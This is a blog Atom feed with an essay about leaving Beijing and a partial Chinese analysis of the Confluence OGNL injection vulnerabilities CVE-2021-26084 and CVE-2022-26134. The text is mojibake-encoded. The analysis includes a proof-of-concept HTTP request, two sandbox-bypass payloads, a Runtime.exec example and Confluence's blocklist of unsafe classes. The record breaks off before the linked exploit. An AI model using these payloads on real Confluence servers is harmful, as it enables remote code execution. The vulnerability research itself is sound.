<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://theoyu.top/feed.xml" rel="self" type="application/atom+xml" /><link href="https://theoyu.top/" rel="alternate" type="text/html" /><updated>2022-10-29T14:09:54+08:00</updated><id>https://theoyu.top/feed.xml</id><title type="html">Theoyu</title><subtitle>Be cool,but also be warm.
</subtitle><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><entry><title type="html">å‘Šåˆ«åŒ—äº¬</title><link href="https://theoyu.top/2022/essay/leaveBJ" rel="alternate" type="text/html" title="å‘Šåˆ«åŒ—äº¬" /><published>2022-07-29T00:00:00+08:00</published><updated>2022-07-29T00:00:00+08:00</updated><id>https://theoyu.top/2022/essay/leaveBJ</id><content type="html" xml:base="https://theoyu.top/2022/essay/leaveBJ"><![CDATA[<!--more-->

<p>å¤§ä¸€çš„æ—¶å€™ï¼Œæˆ‘æœ€å–œæ¬¢å¬çš„æ­Œå°±æ˜¯é‚£å¾å…‹çƒ­çš„ã€ é£˜å‘åŒ—æ–¹ ã€ã€‚è®°å¾—æœ‰ä¸€æ¬¡è¢«æ•™å®˜ç‚¹ä¸Šå»è¡¨æ¼”æ‰è‰ºï¼Œæˆ‘ä¸€æ—¶å¤´çƒ­ï¼Œå°±é€‰æ‹©æ¸…å”±äº†è¿™é¦–ï¼Œé‚£åœºé¢ï¼Œä½ å¯ä»¥æƒ³æƒ³å¤šå°´å°¬ã€‚ä¸è¿‡æ„å¤–çš„æ˜¯æ•ˆæœå¥½åƒè¿˜è¡Œï¼Œè‡³å°‘æˆ‘å®¤å‹æ˜¯è¿™ä¹ˆè¯´çš„ã€‚</p>

<p>åœ¨è¿™ç¯‡æ–‡ç« èµ·ç¬”æ—¶ï¼Œæˆ‘æ˜¯ä¸æƒ³å»ç‰µåŠå¤ªå¤šå·¥ä½œç›¸å…³çš„äº‹æƒ…ï¼Œä½†åæ¥çœ‹åˆ°ç½‘ä¸Šå¾ˆå¤šå…³äºè¿™å®¶å…¬å¸ä¸€ç¥¨å¦å†³çš„è´Ÿé¢è¯„ä»·ï¼Œæˆ‘è¿˜æ˜¯æƒ³è¯´å…¬å¸çš„ä»·å€¼è§‚ä¹Ÿå¥½ï¼Œå¤–é¢äººçš„è¯„ä»·ä¹Ÿå¥½ï¼Œä½†ç›´æ¥å†³å®šçš„è¿˜æ˜¯ä½ çš„éƒ¨é—¨ï¼Œä¸åŒéƒ¨é—¨ä¹‹é—´åƒå·®ä¸‡åˆ«ï¼Œæœ‰çš„éƒ¨é—¨ç”¨æ‰€è°“çš„ã€ å·¥æ—¶æ’å ã€æ¥æ¶æ€§ç«äº‰ï¼Œåœ¨åœ¨æˆ‘ä»¬éƒ¨é—¨å®Œå…¨ä¸å­˜åœ¨è¿™æ ·çš„æƒ…å†µã€‚</p>

<p>æˆ‘æ˜¯åœ¨åŒ—äº¬ç–«æƒ…æœ€ä¸¥é‡çš„æ—¶å€™æ¥çš„è¥¿åŸï¼ˆå°‘æ•°å‡ ä¸ªç–«æƒ…ä¸ä¸¥é‡çš„åŒºï¼‰ï¼Œå¹¶ä¸”åœ¨æˆ‘æ¥åŒ—äº¬çš„å‰ä¸€å¤©æˆ‘ç§Ÿçš„æˆ¿å­çš„åœ°åŒºå‡çº§ä¸ºé«˜é£é™©ï¼Œä½äº†å‡ å¤©å®¾é¦†åå¥½åœ¨å‡ ä¸ªå§å§å“¥å“¥æ”¶ç•™äº†æˆ‘ï¼Œä¸€èµ·åˆç§Ÿã€‚è¿™é‡Œè¯´ä¸€ä¸‹çŸ­æœŸç§Ÿæˆ¿çš„è¯æœ€å¥½ä¸è¦æ‰¾ç¬¬ä¸‰æ–¹ä¸­ä»‹ï¼ˆ58åŒåŸã€å®‰å±…å®¢ã€è‡ªå¦‚ç­‰ç­‰ï¼‰ï¼Œå› ä¸ºè¿™é‡Œå¤§éƒ¨åˆ†æˆ¿å­æ˜¯ä¸æ”¯æŒçŸ­ç§Ÿçš„ï¼Œå¼ºè¡ŒçŸ­ç§Ÿçš„è¯è¿˜è¦å¤šæ”¯ä»˜ä¸€ä¸ªæœˆçš„è¿çº¦è´¹ï¼Œå¹¶ä¸”æœåŠ¡è´¹ä¹Ÿå¾ˆé«˜ã€‚åœ¨å­¦é•¿çš„å»ºè®®ä¸‹æˆ‘åŠ äº†å¾ˆå¤šåŒ—äº¬ç§Ÿæˆ¿ç¾¤ã€å°ç¨‹åºç­‰ç­‰æ‰¾æˆ¿å­ï¼Œæœ€åæˆ‘éƒ½æ²¡æƒ³åˆ°æ˜¯åœ¨å°çº¢ä¹¦æ‰¾åˆ°äº†å½’å®¿ â€¦</p>

<p>ä¹Ÿæ˜¯ç–«æƒ…çš„åŸå› ï¼Œç¬¬ä¸€å‘¨æ•´ä¸ªéƒ¨é—¨åªæœ‰æˆ‘å’Œå­¦é•¿ä¸¤ä¸ªäººåœ¨ï¼ˆå­¦é•¿ä½çš„æ¯”è¾ƒè¿‘ï¼‰ï¼Œæ¯å¤©ä¸‹åˆå­¦é•¿å°±ä¼šå¸¦æˆ‘å»æ•£æ­¥ï¼ˆæ‘¸é±¼ï¼‰ï¼Œå’Œæˆ‘ä»‹ç»å…¬å¸å‘¨å›´çš„ç¯å¢ƒï¼Œåæ¥é™†é™†ç»­ç»­æœ‰å…¶ä»–å‰è¾ˆåˆ°å²—ï¼Œå­¦é•¿å°±ä¼šæ¯å¤©æ‹‰å‡ ä¸ªäººå’Œæˆ‘ä¸€èµ·æ•£æ­¥ï¼Œå½¼æ­¤ä»‹ç»ç†Ÿæ‚‰ã€‚å‰è¾ˆä»¬ä¹Ÿéå¸¸å‹å¥½ï¼Œè®©æˆ‘ä¸è¦æœ‰ä»»ä½•é¡¾è™‘ï¼Œåšæƒ³åšçš„å°±è¡Œã€‚</p>

<p>Mentor <a href="https://github.com/Mochazz">Mochazz</a> æ˜¯ä¸€ä¸ªéå¸¸æ¸©æŸ”ç»†å¿ƒçš„å¸ˆå‚…ï¼Œå¯¹äºæŠ€æœ¯ä¸Šçš„é—®é¢˜æˆ‘ç»å¸¸ä¼šæ­»ç£•åˆ°åº•ï¼Œä½†ä»–éƒ½ä¼šä¸åŒå…¶çƒ¦çš„å’Œæˆ‘è®²è§£ã€‚åŒæ—¶åœ¨éš”å£å·¥ä½è¿˜è§åˆ°äº†å¶åƒ <a href="https://github.com/c0ny1">C0ny1</a> ï¼Œä¹Ÿæ˜¯ååˆ†å¹³æ˜“è¿‘äººã€‚æˆ‘æ„è¯†åˆ°è¿™äº›å¤§å“¥å…¶å®å’Œæˆ‘ä»¬ä¸€æ ·ï¼Œæ— éæ˜¯æœ‰è‡ªå·±çš„æƒ³æ³•ã€åœ¨å·¥ä½œçš„æ—¶å€™æ›´åŠ ä¸“æ³¨è®¤çœŸï¼Œä¼šåœ¨ä¼‘é—²çš„æ—¶é—´é‡Œå¥èº«ã€äº«å—ç”Ÿæ´»ã€‚æ˜¾ç„¶æˆ‘è¿˜æ²¡æœ‰å­¦ä¼šè¿™ä¸€ç‚¹ï¼Œæˆ–è®¸è¿™æ˜¯æœªæ¥é•¿æœŸçš„ä¸€ä¸ªé˜¶æ®µæˆ‘æ‰€éœ€è¦å»å­¦ä¹ çš„ã€‚</p>

<p>æ€»çš„æ¥è¯´è¿™æ˜¯ä¸€ä»½å¾ˆæ£’çš„å·¥ä½œï¼Œæ— è®ºæ˜¯ä»å·¥ä½œå†…å®¹å’Œå·¥ä½œæ°›å›´ä¸Šï¼Œè¿˜æ˜¯ä»æœªæ¥çš„æˆé•¿ä¸Šã€‚åœ¨è¿™é‡Œæˆ‘æ²¡æœ‰çœ‹åˆ°æ‰€è°“çš„ push å’Œå‹æ¦¨ï¼Œåªæœ‰å‹å–„å’Œæœ€çº¯ç²¹çš„çƒ­çˆ±ã€‚å¸Œæœ›æœ‰ä¸€å¤©æˆ‘ä¹Ÿèƒ½æˆä¸ºç»†å¿ƒè´Ÿè´£çš„ mentorï¼Œä»¥æ¸©æŸ”å’Œå–„æ„å¯¹å¾…æ¯ä¸€ä½æ±‚å­¦è€…ã€‚</p>

<p>ç¦»å¼€çš„å‰ä¸€å¤©ä½³å¥•å¸¦æˆ‘é€›äº†é€›åŒ—äº¬ï¼Œä»å¤©å®‰é—¨åˆ°æµ·æ´‹å…¬å›­ï¼Œä»æ—©ä¸Šåç‚¹åˆ°æ™šä¸Šåä¸€ç‚¹ï¼Œæˆ‘çœŸæ²¡æƒ³åˆ°ä¸¤ä¸ªç”·ç”Ÿå¯ä»¥èŠè¿™ä¹ˆä¹…ã€‚å…³äºå·¥ä½œï¼Œè™½ç„¶æˆ‘ä¿©å¤„äºå·®åˆ«æ¯”è¾ƒå¤§çš„é¢†åŸŸï¼Œä½†éƒ½å¯ä»¥é€šè¿‡å½¼æ­¤çš„ä¸“ä¸šçŸ¥è¯†å»äº†è§£ï¼Œç†ä¼šç›¸å…³çš„æŠ€æœ¯ï¼›å…³äºç”Ÿæ´»ï¼Œå¤§å¤šæ•°è§‚ç‚¹æˆ‘ä»¬éƒ½æ˜¯ç›¸é€šçš„ï¼ŒåŸºæœ¬ä¸Šä¸€ä¸ªçœ¼ç¥å°±èƒ½æ˜ç™½å½¼æ­¤æƒ³è¦è¡¨è¾¾çš„æ„æ€ï¼›ä½†æ˜¯è¯´åˆ°æœªæ¥ï¼Œæˆ‘çŠ¹è±«äº†ã€‚<del>ä»¥ä¸‹åˆ å»æ— æ•°æˆ‘çš„æ— ç—…å‘»åŸ</del>â€¦ æˆ–è®¸æˆ‘èƒ½åšåˆ°çš„å°±æ˜¯åœ¨åŒ—äº¬çš„æ—¥å­é‡Œï¼Œå°½å¯èƒ½å»äº«å—å®ƒæ‰€ç»™æˆ‘å¸¦æ¥çš„ä¾¿åˆ©ï¼Œä»…æ­¤è€Œå·²ã€‚</p>

<p>ã€ æµ·æ´‹çš„ç”Ÿç‰©ï¼Œä»–ä»¬æ´»ç€çš„æ„ä¹‰æ˜¯ä»€ä¹ˆå‘¢ ï¼Ÿã€ä½³å¥•é—®æˆ‘ï¼Œä½†æˆ‘æ²¡èƒ½å›ç­”ä¸Šã€‚</p>

<p><img src="../../assets/images/image-20220731115655863.png" alt="image-20220731115655863" /></p>

<p><img src="../../assets/images/image-20220731115727516.png" alt="image-20220731115727516" /></p>

<p>ã€ çŸ¥è¶³çš„å¿«ä¹å…¶å®æ‰æ˜¯æ°¸ä¹… ã€‚ã€è¿™æ˜¯æœ€åä½³å¥•ç•™çš„è¨€ã€‚</p>

<p>æœªæ¥æ˜¯æ€ä¹ˆæ ·ï¼Ÿè°çŸ¥é“å‘¢ï¼Œåšå¥½å½“ä¸‹å§ã€‚</p>

<p><strong>So , Where is the next station?</strong></p>]]></content><author><name>Theoyu</name></author><category term="essay" /><category term="essay" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Confluence æ¼æ´åˆ†æ</title><link href="https://theoyu.top/2022/codeaudit/Confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" rel="alternate" type="text/html" title="Confluence æ¼æ´åˆ†æ" /><published>2022-06-08T00:00:00+08:00</published><updated>2022-06-08T00:00:00+08:00</updated><id>https://theoyu.top/2022/codeaudit/Confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</id><content type="html" xml:base="https://theoyu.top/2022/codeaudit/Confluence%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><![CDATA[<p>FROM CVE-2021-26084 TO  CVE-2022-26134 ,Bypass Sandbox And Inject Memory Shell</p>

<!--more-->

<h2 id="cve-2021-26084">CVE-2021-26084</h2>

<ul>
  <li>Confluence &lt; 6.13.23</li>
  <li>6.14.0 â‰¤ Confluence &lt; 7.4.11</li>
  <li>7.5.0 â‰¤ Confluence &lt; 7.11.6</li>
  <li>7.12.0 â‰¤ Confluence &lt; 7.12.5</li>
  <li>Confluence &lt; 7.13.0</li>
</ul>

<p>ä¹‹å‰å¯¹struts2æ¡†æ¶äº†è§£çš„æ¯”è¾ƒå°‘ï¼Œç«™åœ¨æ¼æ´å¤ç°çš„è§’åº¦æ¢³ç†ä¸€ä¸‹ï¼š</p>

<h3 id="velocityæ¨¡æ¿å¼•æ“">velocityæ¨¡æ¿å¼•æ“</h3>

<p>confluenceä½¿ç”¨velocityæ¨¡ç‰ˆå¼•æ“ï¼Œå¤„ç†vmæ–‡ä»¶æ—¶ï¼Œä¼šæŠŠvmå†…å®¹è½¬åŒ–ä¸ºASTè¯­æ³•æ ‘ï¼Œç„¶ååˆ†åˆ«å¤„ç†æ¯ä¸€ä¸ªç»“ç‚¹çš„å†…å®¹ï¼ŒæŠŠç»“æœè¾“å‡ºã€‚è¿™ä¸ªè¿‡ç¨‹æˆ‘ç†è§£æœ‰ä¸€ç‚¹åƒsqlé¢„ç¼–è¯‘ï¼Œæå‰ç¡®å®šå¥½ä½ç½®ï¼Œå†æå–å¯¹åº”çš„é”®å€¼å¯¹è§£æï¼Œæœ€åæ¸²æŸ“åˆ°å‰ç«¯å±•ç¤ºã€‚</p>

<p>æˆ‘ä»¬å…ˆå‘ä¸€ä¸ªpocåŒ…ï¼š</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/pages/createpage-entervariables.action</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">ty.com:8090</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">47</span>

queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027
</code></pre></div></div>

<p>è½¬åŒ–ååˆ°ASTå¯ä»¥åœ¨ <strong>org.apache.velocity.Template</strong> ä¸‹çš„<strong>data</strong>å±æ€§æŸ¥çœ‹ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164131.png" alt="image-20220608172206591" /></p>

<p>æœç´¢å­æ ‘ï¼Œå¯ä»¥å®šä½ <strong>queryString</strong>ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164139.png" alt="image-20220608172118978" /></p>

<p>ç¡®å®šå¥½æ¨¡ç‰ˆä¹‹åï¼Œå°±æ˜¯è·å– <code class="language-plaintext highlighter-rouge">pages/createpage-entervariables.vm</code> æ ‡ç­¾ä¸­æ‰€å®šä¹‰çš„å˜é‡ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164142.png" alt="image-20220608190418386" /></p>

<p>å…¶ä¸­çš„velocityåŸºæœ¬è¯­æ³•ï¼š</p>

<pre><code class="language-txt">"#" : æ ‡è¯†velocityçš„è„šæœ¬è¯­å¥
"$" : è·å–ä¸€ä¸ªå¯¹è±¡æˆ–å˜é‡
"!" : å¯¹å˜é‡ä¸ºnullçš„æƒ…å†µåœ¨é¡µé¢æ˜¾ç¤ºä¸ºç©ºç™½å­—ç¬¦ä¸²
</code></pre>

<p>åœ¨<code class="language-plaintext highlighter-rouge">AbstractTagDirective.createPropertyMap()</code>ä¸‹åˆ›å»ºäº†ä¸€ä¸ªmapï¼Œç”¨äºä¿å­˜tagä¸­çš„é”®å€¼å¯¹ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164150.png" alt="image-20220608200447599" /></p>

<p>ä¹‹åè¿›å…¥<code class="language-plaintext highlighter-rouge">processTag()</code>æ–¹æ³•ï¼Œç”¨äºå¤„ç†tagï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164154.png" alt="image-20220608232231071" /></p>

<p>åœ¨<code class="language-plaintext highlighter-rouge">processTag()</code>çš„æœ«å°¾ï¼Œè°ƒç”¨äº†<code class="language-plaintext highlighter-rouge">doEndTag()</code>æ–¹æ³•ï¼Œè·Ÿè¿›<code class="language-plaintext highlighter-rouge">evaluateParams(stack)</code>ï¼Œå…¶å®å°±æ˜¯ç”¨Ognlè¡¨è¾¾å¼å»å¤„ç†tagä¸­çš„å†…å®¹ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164157.png" alt="image-20220608234226356" /></p>

<p>å¯ä»¥çœ‹åˆ°åœ¨æ‰§è¡ŒOgnlè¡¨è¾¾å¼ä¹‹å‰ï¼Œè¿˜ç»è¿‡äº†ä¸€æ¬¡è¡¨è¾¾å¼æ£€æŸ¥ï¼Œè¿™ä¸ªæˆ‘ä»¬æ”¾åœ¨åé¢è¯´ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬çš„expræ˜¯è¢«<code class="language-plaintext highlighter-rouge">''</code>æ‰€åŒ…è£¹çš„ï¼Œæ‰€ä»¥Ognlå¹¶ä¸ä¼šè§£æé‡Œé¢çš„å†…å®¹ï¼Œè€Œåœ¨æ‰§è¡Œä¹‹å‰exprä¼šç»è¿‡ä¸€è½®<code class="language-plaintext highlighter-rouge">OgnlUtil.compile(expr)</code>ï¼Œæ”¯æŒå¯¹unicodeç¼–ç çš„è§£ç ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨<code class="language-plaintext highlighter-rouge">\u0027</code>é—­åˆå•å¼•å· ã€‚</p>

<h3 id="å®‰å…¨æ£€æµ‹">å®‰å…¨æ£€æµ‹</h3>

<p>é¦–å…ˆ<code class="language-plaintext highlighter-rouge">Ognl.getValue()</code> è§£æ Onglè¯­å¥ï¼Œå°±ä¼šå°†å…¶è½¬åŒ–ä¸ºä¸€é¢— ASTChain è¯­æ³•æ ‘æ‰§è¡Œï¼Œæ¯”å¦‚è¡¨è¾¾å¼ï¼š<code class="language-plaintext highlighter-rouge">@java.lang.Runtime@getRuntime().exec("calc")</code>ï¼Œä¸‹å›¾ä¸ºå…¶æ‰€å¯¹åº”çš„è¯­æ³•æ ‘ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164205.png" alt="image-20220609104544611" /></p>

<p>ç°åœ¨çœ‹å®‰å…¨é˜²æŠ¤çš„é—®é¢˜ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164212.png" alt="" /></p>

<p>é’ˆå¯¹ä»¥ä¸Šæ£€æµ‹ï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹å¼ç»•è¿‡æ£€æµ‹ä»¥è·å–Classå¯¹è±¡ï¼š</p>

<h4 id="ç»•è¿‡ä¸€">ç»•è¿‡ä¸€</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>queryString=\u0027%2b{Class}%2b\u0027
ç­‰äº
{Class}
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164215.png" alt="image-20220610001758198" /></p>

<p>å½“Onglè§£æä¸€ä¸ªå±æ€§ <strong>a</strong>  æˆ–è€… <strong>A</strong>æ—¶ï¼Œéƒ½ä¼šä»  Context é”®å€¼å¯¹ä¸­è°ƒç”¨ <code class="language-plaintext highlighter-rouge">getA</code> æ¥å°è¯•è·å–å±æ€§ï¼Œè€Œæ£€æµ‹ä¸­åªè¿‡æ»¤äº†å°å†™<strong>class</strong>çš„æƒ…å†µï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ©ç”¨å¤§å†™ <strong>Class</strong> å±æ€§æ¥è°ƒç”¨contextä¸­çš„ <code class="language-plaintext highlighter-rouge">getClass()</code> æ–¹æ³•ä»è€Œè·å–Classå¯¹è±¡ã€‚</p>

<h4 id="ç»•è¿‡äºŒ">ç»•è¿‡äºŒ</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>queryString=\u0027%2b{[\u0022class\u0022]}%2b\u0027
ç­‰äº
{['class']}
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164222.png" alt="image-20220610003243339" /></p>

<p>è¿™ä¸€ç»•è¿‡ä¹Ÿæ˜¯åˆ©ç”¨Ognlåœ¨è§£ææ—¶çš„å·®å¼‚ï¼Œé’ˆå¯¹ <code class="language-plaintext highlighter-rouge">['class']</code> å±æ€§ï¼Œæ˜¯å’Œ <code class="language-plaintext highlighter-rouge">.class</code> ä¸€æ ·éƒ½å¯ä»¥è°ƒç”¨åˆ°<code class="language-plaintext highlighter-rouge">getClass()</code>æ–¹æ³•ï¼Œè€Œåœ¨æ£€æµ‹æ—¶æ˜¯è°ƒç”¨è¢«æµ‹å±æ€§çš„<code class="language-plaintext highlighter-rouge">toString</code>æ–¹æ³•ï¼Œè€Œ<code class="language-plaintext highlighter-rouge">['class']</code> ç›¸å½“äºè¿”å›è‡ªèº«ï¼Œæ•…ç»•è¿‡äº†æ£€æµ‹ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164225.png" alt="image-20220610004326852" /></p>

<p>æ‹¿åˆ°Classå¯¹è±¡ä¹‹åï¼Œåˆ©ç”¨å°±å¥½è¯´äº†ï¼Œåˆ©ç”¨forNameå°±å¯ä»¥è°ƒç”¨å„ç§æ–¹æ³•ã€‚</p>

<h2 id="cve-2022-26134">CVE-2022-26134</h2>

<ul>
  <li>1.3.0 â‰¤  Confluence &lt; 7.4.17</li>
  <li>7.13.0 â‰¤  Confluence &lt; 7.13.7</li>
  <li>7.14.0 â‰¤  Confluence &lt; 7.14.3</li>
  <li>7.15.0 â‰¤  Confluence &lt; 7.15.2</li>
  <li>7.16.0 â‰¤  Confluence &lt; 7.16.4</li>
  <li>7.17.0 â‰¤  Confluence &lt; 7.17.4</li>
  <li>7.18.0 â‰¤  Confluence &lt; 7.18.1</li>
</ul>

<p>CVE-2022-26134çš„ Ognl è¾“å…¥ç‚¹åœ¨urlå¤„ï¼Œconfluenceçš„åˆ†å‘å™¨ä¼šæŠŠè¯·æ±‚äº¤ç»™å†…éƒ¨28ä¸ªæ‹¦æˆªå™¨ï¼ˆinterceptorsï¼‰å¤„ç†ï¼Œ</p>

<p>å…¶ä¸­å¤§éƒ¨åˆ†æ‹¦æˆªå™¨åœ¨å¤„ç†æ—¶ï¼Œåˆä¼šå›åˆ°<code class="language-plaintext highlighter-rouge">invocation.invoke()</code>æ–¹æ³•ï¼Œå½¢æˆä¸€ä¸ªå¾ªç¯ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164230.png" alt="image-20220613030021374" /></p>

<p>ä½†æ˜¯ç¬¬10å·æ‹¦æˆªå™¨ <strong>actionAccessChecker</strong> ä¸ä¸€æ ·ï¼Œå…¶åˆ¤æ–­äº†è¯·æ±‚çš„actionï¼Œå¹¶é»˜è®¤è¿”å› <strong>notpermitted</strong>ï¼Œä»è€Œè·³å‡ºäº†å¾ªç¯ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164234.png" alt="image-20220613023859251" /></p>

<p>è·³å‡ºåï¼Œèµ°åˆ°<code class="language-plaintext highlighter-rouge">this.execteResult()</code>:</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164239.png" alt="image-20220613024215763" /></p>

<p>ä¹‹åä¸€è·¯è·Ÿè¿›ï¼Œè¿›å…¥æœ€åçš„æ‰§è¡Œç‚¹<code class="language-plaintext highlighter-rouge">TextParseUtil.translateVariables(this.namespace, stack)</code>ï¼Œè¿™é‡Œå¯¹ <strong>namespace</strong> (åœ¨è½¬å‘å™¨ ServletDispatcher å¯¹urlåšçš„æå–) è¿›è¡Œäº†ognlè¡¨è¾¾å¼å¤„ç†ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164243.png" alt="image-20220613030947118" /></p>

<p>åŒæ ·è¿˜æœ‰ç†Ÿæ‚‰çš„<code class="language-plaintext highlighter-rouge">safeExpressionUtil.isSafeExpression(expr)</code>, confluence åœ¨7.13.0ä¹‹åæ”¹å†™äº†è¿™ä¸ªæ¨¡å—ï¼Œå¼•å…¥äº†æ›´åŠ å¤æ‚çš„é»‘åå•ä»¥åŠç™½åå•æœºåˆ¶ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//unsafePropertyNames

0 = "sun.misc.Unsafe"
1 = "classLoader"
2 = "java.lang.System"
3 = "java.lang.ThreadGroup"
4 = "com.opensymphony.xwork.ActionContext                 java.lang.Compiler"
5 = "com.atlassian.applinks.api.ApplicationLinkRequestFactory"
6 = "java.lang.Thread"
7 = "com.atlassian.core.util.ClassLoaderUtils"
8 = "java.lang.ProcessBuilder"
9 = "java.lang.InheritableThreadLocal"
10 = "com.atlassian.core.util.ClassHelper"
11 = "class"
12 = "java.lang.Shutdown"
13 = "java.lang.ThreadLocal"
14 = "java.lang.Process"
15 = "java.lang.Package"
16 = "org.apache.tomcat.InstanceManager"
17 = "java.lang.Runtime"
18 = "javax.script.ScriptEngineManager"
19 = "javax.persistence.EntityManager"
20 = "org.springframework.context.ApplicationContext"
21 = "java.lang.SecurityManager"
22 = "java.lang.Object"
23 = "java.lang.Class"
24 = "java.lang.RuntimePermission"
25 = "javax.servlet.ServletContext"
26 = "java.lang.ClassLoader"

//unsafePackageNames

0 = "java.rmi"
1 = "sun.management"
2 = "org.apache.catalina.session"
3 = "java.jms"
4 = "com.atlassian.confluence.util.io"
5 = "com.google.common.reflect"
6 = "javax.sql"
7 = "java.nio"
8 = "com.atlassian.sal.api.net"
9 = "sun.invoke"
10 = "java.util.zip"
11 = "liquibase"
12 = "com.hazelcast"
13 = "org.apache.commons.httpclient"
14 = "com.atlassian.util.concurrent"
15 = "java.net"
16 = "freemarker.ext.jsp"
17 = "com.sun.jna"
18 = "net.java.ao"
19 = "javax"
20 = "sun.corba"
21 = "org.springframework.util.concurrent"
22 = "com.sun.jmx"
23 = "sun.misc"
24 = "javassist"
25 = "ognl"
26 = "org.apache.commons.exec"
27 = "com.atlassian.cache"
28 = "org.wildfly.extension.undertow.deployment                 java.lang.reflect"
29 = "io.atlassian.util.concurrent"
30 = "java.util.concurrent"
31 = "com.atlassian.confluence.util.http"
32 = "sun.tracing"
33 = "org.objectweb.asm"
34 = "freemarker.template"
35 = "net.sf.hibernate"
36 = "freemarker.core"
37 = "net.bytebuddy"
38 = "org.apache.tomcat"
39 = "freemarker.ext.rhino"
40 = "com.atlassian.media"
41 = "org.springframework.context"
42 = "org.apache.velocity"
43 = "javax.xml"
44 = "java.sql"
45 = "sun.reflect"
46 = "sun.net"
47 = "javax.persistence"
48 = "org.javassist"
49 = "javax.naming"
50 = "org.apache.httpcomponents.httpclient"
51 = "com.atlassian.hibernate"
52 = "sun.nio"
53 = "com.atlassian.confluence.impl.util.sandbox"
54 = "com.google.common.net"
55 = "com.atlassian.filestore"
56 = "org.apache.commons.io"
57 = "com.atlassian.vcache"
58 = "jdk.nashorn"
59 = "sun.launcher"
60 = "oshi"
61 = "org.apache.bcel"
62 = "sun.rmi"
63 = "sun.tools.jar"
64 = "org.springframework.expression.spel"
65 = "com.opensymphony.xwork.util"
66 = "org.ow2.asm"
67 = "com.atlassian.confluence.setup.bandana"
68 = "org.quartz"
69 = "net.sf.cglib"
70 = "com.atlassian.activeobjects"
71 = "com.atlassian.utils.process"
72 = "sun.security"
73 = "com.atlassian.quartz"
74 = "javax.management"
75 = "sun.awt.shell"
76 = "com.google.common.cache"
77 = "org.apache.http.client"
78 = "java.io"
79 = "com.atlassian.confluence.util.sandbox"
80 = "java.util.jar"
81 = "com.atlassian.scheduler"
82 = "sun.print"
83 = "com.atlassian.failurecache"
84 = "com.google.common.io"
85 = "org.apache.catalina.core"
86 = "org.ehcache"

//unsafeMethodNames

0 = "getClass"
1 = "getClassLoader"

//allowedClassNames

0 = "net.sf.hibernate.proxy.HibernateProxy"
1 = "java.lang.reflect.Proxy"
2 = "net.java.ao.EntityProxyAccessor"
3 = "net.java.ao.RawEntity"
4 = "net.sf.cglib.proxy.Factory"
5 = "java.io.ObjectInputValidation"
6 = "net.java.ao.Entity"
7 = "com.atlassian.confluence.util.GeneralUtil"
8 = "java.io.Serializable"
</code></pre></div></div>

<p>ä¸ºä»€ä¹ˆä¼šå¼•å…¥ç™½åå•å‘¢ï¼Ÿå› ä¸º13ä¹‹åçš„ <code class="language-plaintext highlighter-rouge">UNSAFE_NODE_TYPES</code> å…è®¸äº† <strong>ognl.ASTStaticMethod</strong>  ç±»å‹çš„èŠ‚ç‚¹ï¼Œä¸è¿‡æŠŠå¯ä»¥è°ƒç”¨çš„ç±»é™åˆ¶åœ¨äº†ç™½åå•å†…ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220617164250.png" alt="image-20220613110143920" /></p>

<h3 id="ç»•è¿‡è¸©å‘">ç»•è¿‡è¸©å‘</h3>

<p>ç½‘ä¸Šå·²ç»å…¬å¼€äº†è®¸å¤šexpï¼Œè¿™é‡Œä¸»è¦è¯´ä¸€ä¸‹æˆ‘åœ¨å¤ç°çš„æ—¶å€™è¸©çš„ä¸€äº›å‘ï¼š</p>

<p>è¿™æ˜¯github staræ¯”è¾ƒå¤šçš„<a href="https://github.com/Nwqda/CVE-2022-26134/blob/master/cve-2022-26134.py">exp</a>:</p>

